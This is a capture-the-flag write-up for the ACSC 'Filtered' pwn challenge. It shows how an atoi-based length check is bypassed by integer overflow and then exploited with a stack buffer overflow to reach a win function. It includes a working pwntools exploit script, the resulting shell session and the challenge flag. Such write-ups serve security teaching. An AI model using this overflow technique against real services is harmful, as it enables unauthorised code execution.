---
description: Buffer overflow with a flawed length check
---

# Filtered

## Description

Filter invalid sizes to make it secure!  
  
Backup: `nc 167.99.78.201 9001`

`nc filtered.chal.acsc.asia 9001`

{% file src="../../.gitbook/assets/filtered.tar.gz\_9a6cb1b3eafce70ff549ba6b942f34a9.gz" caption="Challenge Files" %}

## Solution

Although there is a length check for `length > 0x100`, it is implemented using `atoi()`:

```c
/* Print `msg` and read an integer value */
int readint(const char *msg) {
  char buf[0x10];
  readline(msg, buf, 0x10);
  return atoi(buf);
}
```

I came across this thread: [https://stackoverflow.com/questions/41869515/overflow-when-change-from-string-to-int-in-c/41869611](https://stackoverflow.com/questions/41869515/overflow-when-change-from-string-to-int-in-c/41869611)

Using `2147483648`, an integer overflow is caused since the largest unsigned int is `2147483647`.

From here, this is a regular buffer overflow challenge. The offset is 280, and we want to jump to the win function here:

```text
0x004011d6    1 65           sym.win
```

Solver script:

```python
from pwn import *

conn = remote("167.99.78.201", 9001)

print(conn.recvuntil(b"Size:"))

conn.send(b"2147483648\r\n")

print(conn.recvuntil(b"Data:"))

conn.send(b"A" * 280 + p64(0x004011d6) + b"\r\n")

conn.interactive()
```

Get the flag:

```text
└─# python3 filtered.py
[+] Opening connection to 167.99.78.201 on port 9001: Done
b'Size:'
b' Data:'
[*] Switching to interactive mode
 Bye!
$ whoami
pwn
$ ls -la
total 36
drwxr-xr-x 1 root pwn   4096 Sep 18 02:21 .
drwxr-xr-x 1 root root  4096 Sep 18 02:21 ..
-r-xr-x--- 1 root pwn     40 Sep 18 02:20 .redir.sh
-r-xr-x--- 1 root pwn  17008 Sep 18 02:20 filtered
-r--r----- 1 root pwn     59 Sep 18 02:20 flag-08d995360bfb36072f5b6aedcc801cd7.txt
$ cat flag-08d995360bfb36072f5b6aedcc801cd7.txt
ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}
$
```

